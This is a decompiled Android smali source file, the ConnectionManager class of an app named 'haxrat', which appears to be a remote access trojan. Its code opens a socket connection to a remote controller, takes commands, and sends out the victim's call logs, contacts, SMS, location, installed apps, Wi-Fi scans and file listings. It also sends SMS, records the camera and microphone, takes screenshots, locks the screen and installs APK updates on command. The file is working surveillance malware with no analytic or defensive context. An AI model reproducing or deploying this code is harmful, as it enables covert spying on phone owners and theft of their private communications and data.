.class public Lcom/hax4us/haxrat/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/hax4us/haxrat/ConnectionManager$100000000;,
        Lcom/hax4us/haxrat/ConnectionManager$100000001;
    }
.end annotation


# static fields
.field public static final COMMAND:Ljava/lang/String; = "cmd"

.field public static final DURATION:Ljava/lang/String; = "secs"

.field public static context:Landroid/content/Context;

.field private static fm:Lcom/hax4us/haxrat/FileManager;

.field private static ioSocket:Lio/socket/client/Socket;


# direct methods
.method static final constructor <clinit>()V
    .locals 5

    new-instance v2, Lcom/hax4us/haxrat/FileManager;

    move-object v4, v2

    move-object v2, v4

    move-object v3, v4

    invoke-direct {v3}, Lcom/hax4us/haxrat/FileManager;-><init>()V

    sput-object v2, Lcom/hax4us/haxrat/ConnectionManager;->fm:Lcom/hax4us/haxrat/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .prologue
    .line 254
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static CL()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 165
    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xCL"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    invoke-static {}, Lcom/hax4us/haxrat/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method public static CO()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 169
    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xCO"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    invoke-static {}, Lcom/hax4us/haxrat/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method public static FC(II)V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(II)V"
        }
    .end annotation

    .prologue
    .line 249
    move v0, p0

    move v1, p1

    move v6, v1

    const/16 v7, 0xa

    if-le v6, v7, :cond_0

    .line 253
    :goto_0
    return-void

    .line 250
    :cond_0
    new-instance v6, Landroid/content/Intent;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    sget-object v8, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    :try_start_0
    const-string v9, "com.hax4us.haxrat.CamService"

    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v9

    invoke-direct {v7, v8, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v3, v6

    .line 251
    move-object v6, v3

    const-string v7, "cam"

    move v8, v0

    invoke-virtual {v6, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v6

    .line 252
    move-object v6, v3

    const-string v7, "secs"

    move v8, v1

    invoke-virtual {v6, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v6

    .line 253
    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    move-object v7, v3

    invoke-virtual {v6, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v6

    goto :goto_0

    .line 250
    :catch_0
    move-exception v6

    move-object v4, v6

    new-instance v6, Ljava/lang/NoClassDefFoundError;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v4

    invoke-virtual {v8}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v6
.end method

.method public static FI(ILjava/lang/String;)V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 143
    move v0, p0

    move-object v1, p1

    move v6, v0

    const/4 v7, 0x0

    if-ne v6, v7, :cond_1

    .line 144
    new-instance v6, Lorg/json/JSONObject;

    move-object v12, v6

    move-object v6, v12

    move-object v7, v12

    invoke-direct {v7}, Lorg/json/JSONObject;-><init>()V

    move-object v3, v6

    .line 146
    move-object v6, v3

    :try_start_0
    const-string v7, "type"

    const-string v8, "list"

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v6

    .line 147
    move-object v6, v3

    const-string v7, "list"

    move-object v8, v1

    invoke-static {v8}, Lcom/hax4us/haxrat/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v6

    .line 148
    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v7, "0xFI"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    move-object v12, v8

    move-object v8, v12

    move-object v9, v12

    const/4 v10, 0x0

    move-object v11, v3

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v8}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v6

    .line 151
    :cond_0
    :goto_0
    return-void

    .line 148
    :catch_0
    move-exception v6

    move-object v4, v6

    goto :goto_0

    .line 150
    :cond_1
    move v6, v0

    const/4 v7, 0x1

    if-ne v6, v7, :cond_0

    .line 151
    move-object v6, v1

    invoke-static {v6}, Lcom/hax4us/haxrat/FileManager;->downloadFile(Ljava/lang/String;)V

    goto :goto_0
.end method

.method public static GP(Ljava/lang/String;)V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 191
    move-object v0, p0

    new-instance v5, Lorg/json/JSONObject;

    move-object v11, v5

    move-object v5, v11

    move-object v6, v11

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    move-object v2, v5

    .line 193
    move-object v5, v2

    :try_start_0
    const-string v6, "permission"

    move-object v7, v0

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v5

    .line 194
    move-object v5, v2

    const-string v6, "isAllowed"

    move-object v7, v0

    invoke-static {v7}, Lcom/hax4us/haxrat/PermissionManager;->canIUse(Ljava/lang/String;)Z

    move-result v7

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    move-result-object v5

    .line 195
    sget-object v5, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v6, "0xGP"

    const/4 v7, 0x1

    new-array v7, v7, [Ljava/lang/Object;

    move-object v11, v7

    move-object v7, v11

    move-object v8, v11

    const/4 v9, 0x0

    move-object v10, v2

    aput-object v10, v8, v9

    invoke-virtual {v5, v6, v7}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v5

    :goto_0
    return-void

    :catch_0
    move-exception v5

    move-object v3, v5

    goto :goto_0
.end method

.method public static IN()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 186
    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xIN"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-static {v7}, Lcom/hax4us/haxrat/AppList;->getInstalledApps(Z)Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method public static LD()V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 211
    sget-object v2, Lcom/hax4us/haxrat/MainService;->mDPM:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v2}, Landroid/app/admin/DevicePolicyManager;->lockNow()V

    return-void
.end method

.method public static LO()V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 202
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 203
    new-instance v3, Lcom/hax4us/haxrat/LocManager;

    move-object v9, v3

    move-object v3, v9

    move-object v4, v9

    sget-object v5, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v4, v5}, Lcom/hax4us/haxrat/LocManager;-><init>(Landroid/content/Context;)V

    move-object v1, v3

    .line 205
    move-object v3, v1

    invoke-virtual {v3}, Lcom/hax4us/haxrat/LocManager;->canGetLocation()Z

    move-result v3

    if-eqz v3, :cond_0

    .line 206
    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v4, "0xLO"

    const/4 v5, 0x1

    new-array v5, v5, [Ljava/lang/Object;

    move-object v9, v5

    move-object v5, v9

    move-object v6, v9

    const/4 v7, 0x0

    move-object v8, v1

    invoke-virtual {v8}, Lcom/hax4us/haxrat/LocManager;->getData()Lorg/json/JSONObject;

    move-result-object v8

    aput-object v8, v6, v7

    invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v3

    :cond_0
    return-void
.end method

.method public static MI(I)V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I)V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 173
    move v0, p0

    move v3, v0

    invoke-static {v3}, Lcom/hax4us/haxrat/MicManager;->startRecording(I)V

    return-void
.end method

.method public static PM()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 181
    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xPM"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    invoke-static {}, Lcom/hax4us/haxrat/PermissionManager;->getGrantedPermissions()Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method public static RC(II)V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(II)V"
        }
    .end annotation

    .prologue
    .line 241
    move v0, p0

    move v1, p1

    move v6, v1

    const/16 v7, 0xa

    if-le v6, v7, :cond_0

    .line 245
    :goto_0
    return-void

    .line 242
    :cond_0
    new-instance v6, Landroid/content/Intent;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    sget-object v8, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    :try_start_0
    const-string v9, "com.hax4us.haxrat.CamService"

    invoke-static {v9}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v9

    invoke-direct {v7, v8, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v3, v6

    .line 243
    move-object v6, v3

    const-string v7, "cam"

    move v8, v0

    invoke-virtual {v6, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v6

    .line 244
    move-object v6, v3

    const-string v7, "secs"

    move v8, v1

    invoke-virtual {v6, v7, v8}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v6

    .line 245
    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    move-object v7, v3

    invoke-virtual {v6, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    move-result-object v6

    goto :goto_0

    .line 242
    :catch_0
    move-exception v6

    move-object v4, v6

    new-instance v6, Ljava/lang/NoClassDefFoundError;

    move-object v13, v6

    move-object v6, v13

    move-object v7, v13

    move-object v8, v4

    invoke-virtual {v8}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v6
.end method

.method public static SM(ILjava/lang/String;Ljava/lang/String;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ")V"
        }
    .end annotation

    .prologue
    .line 156
    move/from16 v0, p0

    move-object/from16 v1, p1

    move-object/from16 v2, p2

    move v6, v0

    const/4 v7, 0x0

    if-ne v6, v7, :cond_1

    .line 157
    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v7, "0xSM"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    const/4 v10, 0x0

    invoke-static {}, Lcom/hax4us/haxrat/SMSManager;->getsms()Lorg/json/JSONObject;

    move-result-object v11

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v8}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v6

    .line 160
    :cond_0
    :goto_0
    return-void

    .line 158
    :cond_1
    move v6, v0

    const/4 v7, 0x1

    if-ne v6, v7, :cond_0

    .line 159
    move-object v6, v1

    move-object v7, v2

    invoke-static {v6, v7}, Lcom/hax4us/haxrat/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v6

    move v4, v6

    .line 160
    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v7, "0xSM"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/Object;

    move-object v14, v8

    move-object v8, v14

    move-object v9, v14

    const/4 v10, 0x0

    move v11, v4

    new-instance v12, Ljava/lang/Boolean;

    move v14, v11

    move-object v15, v12

    move-object v11, v15

    move v12, v14

    move-object v13, v15

    move v14, v12

    move-object v15, v13

    move-object v12, v15

    move v13, v14

    invoke-direct {v12, v13}, Ljava/lang/Boolean;-><init>(Z)V

    aput-object v11, v9, v10

    invoke-virtual {v6, v7, v8}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v6

    goto :goto_0
.end method

.method public static SR(I)V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(I)V"
        }
    .end annotation

    .prologue
    .line 233
    move v0, p0

    move v5, v0

    const/16 v6, 0xa

    if-le v5, v6, :cond_0

    .line 237
    :goto_0
    return-void

    .line 234
    :cond_0
    new-instance v5, Landroid/content/Intent;

    move-object v12, v5

    move-object v5, v12

    move-object v6, v12

    sget-object v7, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    :try_start_0
    const-string v8, "com.hax4us.haxrat.TransparentActivity"

    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v8

    invoke-direct {v6, v7, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v2, v5

    .line 235
    move-object v5, v2

    const-string v6, "flag"

    const/4 v7, 0x2

    invoke-virtual {v5, v6, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v5

    .line 236
    move-object v5, v2

    const-string v6, "secs"

    move v7, v0

    invoke-virtual {v5, v6, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v5

    .line 237
    sget-object v5, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    move-object v6, v2

    invoke-virtual {v5, v6}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 234
    :catch_0
    move-exception v5

    move-object v3, v5

    new-instance v5, Ljava/lang/NoClassDefFoundError;

    move-object v12, v5

    move-object v5, v12

    move-object v6, v12

    move-object v7, v3

    invoke-virtual {v7}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v5
.end method

.method public static SS()V
    .locals 12
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 226
    new-instance v4, Landroid/content/Intent;

    move-object v11, v4

    move-object v4, v11

    move-object v5, v11

    sget-object v6, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    :try_start_0
    const-string v7, "com.hax4us.haxrat.TransparentActivity"

    invoke-static {v7}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v7

    invoke-direct {v5, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    move-object v1, v4

    .line 227
    move-object v4, v1

    const-string v5, "flag"

    const/4 v6, 0x1

    invoke-virtual {v4, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v4

    .line 228
    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    move-object v5, v1

    invoke-virtual {v4, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 229
    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v5, "0xSS"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    const/4 v8, 0x0

    const-string v9, "screenshot"

    aput-object v9, v7, v8

    invoke-virtual {v4, v5, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v4

    return-void

    .line 226
    :catch_0
    move-exception v4

    move-object v2, v4

    new-instance v4, Ljava/lang/NoClassDefFoundError;

    move-object v11, v4

    move-object v4, v11

    move-object v5, v11

    move-object v6, v2

    invoke-virtual {v6}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/NoClassDefFoundError;-><init>(Ljava/lang/String;)V

    throw v4
.end method

.method public static UD()V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V^",
            "Ljava/io/IOException;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 216
    new-instance v4, Ljava/io/File;

    move-object v10, v4

    move-object v4, v10

    move-object v5, v10

    const-string v6, "/storage/emulated/0/backups/apps/lemon.apk"

    invoke-direct {v5, v6}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    move-object v1, v4

    .line 217
    move-object v4, v1

    invoke-virtual {v4}, Ljava/io/File;->exists()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 218
    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v5, "0xUD"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    const/4 v8, 0x0

    const-string v9, "pandey"

    aput-object v9, v7, v8

    invoke-virtual {v4, v5, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v4

    .line 219
    :cond_0
    new-instance v4, Ljava/io/FileInputStream;

    move-object v10, v4

    move-object v4, v10

    move-object v5, v10

    move-object v6, v1

    invoke-direct {v5, v6}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    move-object v2, v4

    .line 220
    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v5, "0xUD"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    const/4 v8, 0x0

    const-string v9, "pandey"

    aput-object v9, v7, v8

    invoke-virtual {v4, v5, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v4

    .line 221
    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    const-string v5, "com.hax4us.haxrat"

    move-object v6, v2

    invoke-static {v4, v5, v6}, Lcom/hax4us/haxrat/AppUpdate;->installPackage(Landroid/content/Context;Ljava/lang/String;Ljava/io/InputStream;)V

    .line 222
    sget-object v4, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v5, "0xUD"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Object;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    const/4 v8, 0x0

    const-string v9, "pandey"

    aput-object v9, v7, v8

    invoke-virtual {v4, v5, v6}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v4

    return-void
.end method

.method public static WI()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 177
    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xWI"

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    move-object v8, v4

    move-object v4, v8

    move-object v5, v8

    const/4 v6, 0x0

    sget-object v7, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v7}, Lcom/hax4us/haxrat/WifiScanner;->scan(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v7

    aput-object v7, v5, v6

    invoke-virtual {v2, v3, v4}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    move-result-object v2

    return-void
.end method

.method static synthetic access$L1000000()Lio/socket/client/Socket;
    .locals 3

    sget-object v2, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    move-object v0, v2

    return-object v0
.end method

.method static synthetic access$S1000000(Lio/socket/client/Socket;)V
    .locals 4

    move-object v0, p0

    move-object v3, v0

    sput-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    return-void
.end method

.method public static sendReq()V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 37
    :try_start_0
    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v3, :cond_0

    .line 127
    :goto_0
    return-void

    .line 39
    :cond_0
    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v3

    sput-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    .line 40
    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v4, "ping"

    new-instance v5, Lcom/hax4us/haxrat/ConnectionManager$100000000;

    move-object v7, v5

    move-object v5, v7

    move-object v6, v7

    invoke-direct {v6}, Lcom/hax4us/haxrat/ConnectionManager$100000000;-><init>()V

    invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    move-result-object v3

    .line 49
    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v4, "order"

    new-instance v5, Lcom/hax4us/haxrat/ConnectionManager$100000001;

    move-object v7, v5

    move-object v5, v7

    move-object v6, v7

    invoke-direct {v6}, Lcom/hax4us/haxrat/ConnectionManager$100000001;-><init>()V

    invoke-virtual {v3, v4, v5}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    move-result-object v3

    .line 124
    sget-object v3, Lcom/hax4us/haxrat/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v3}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v3

    .line 127
    :goto_1
    goto :goto_0

    .line 124
    :catch_0
    move-exception v3

    move-object v1, v3

    .line 127
    const-string v3, "error"

    move-object v4, v1

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    goto :goto_1
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            ")V"
        }
    .end annotation

    .prologue
    .line 27
    move-object v0, p0

    move-object v4, v0

    :try_start_0
    sput-object v4, Lcom/hax4us/haxrat/ConnectionManager;->context:Landroid/content/Context;

    .line 28
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 30
    :goto_0
    return-void

    .line 28
    :catch_0
    move-exception v4

    move-object v2, v4

    .line 30
    move-object v4, v0

    invoke-static {v4}, Lcom/hax4us/haxrat/ConnectionManager;->startAsync(Landroid/content/Context;)V

    goto :goto_0
.end method
